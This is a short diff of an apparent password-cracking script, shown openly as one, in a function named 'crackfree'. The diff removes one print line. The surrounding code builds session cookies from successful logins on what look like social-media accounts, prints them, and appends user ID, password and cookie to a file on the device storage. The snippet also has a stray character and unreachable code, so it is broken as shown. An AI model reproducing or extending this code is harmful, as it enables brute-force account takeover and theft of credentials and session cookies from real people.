@@ -750,7 +750,6 @@ def crackfree(idf,pwv):
                 break
                 if 'access_token' in q:j
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Tutulb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Tutulb};{ckkk}"
-                print(f'\r\r\033[38;5;46m[Tutul-LIVE] {uid} | {pas}')
                 print(f'\r\r\033[38;5;46m[COOKIE]\033[38;5;46m {cookie}')
                 open('/sdcard/SK-TUTUL-FILE-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                 ok.append(uid)
